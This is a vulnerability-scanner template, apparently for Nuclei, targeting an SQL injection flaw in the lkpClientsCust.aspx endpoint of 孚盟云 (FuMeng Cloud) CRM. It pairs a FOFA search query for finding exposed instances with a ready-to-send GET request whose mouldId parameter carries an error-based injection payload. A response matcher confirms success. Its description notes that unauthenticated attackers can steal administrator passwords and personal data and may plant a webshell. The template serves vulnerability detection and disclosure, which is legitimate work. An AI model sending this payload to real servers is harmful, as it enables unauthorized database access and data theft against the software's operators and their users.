id: FuMengYun-lkpClientsCust_aspx-SQL

info:
  name: 孚盟云 lkpClientsCust.aspx SQL注入
  author: HuanXiong
  severity: high
  description: |
    fofa: app="孚盟软件-孚盟云"、icon_hash="1533124028"
    孚盟云 lkpClientsCust.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    -
  tags: SQL Injection

http:
  - raw:
      - |-
        GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=@@VERSION-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        
    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==500 && contains_all(body,'nvarchar','转换成数据类型 int 时失败')"
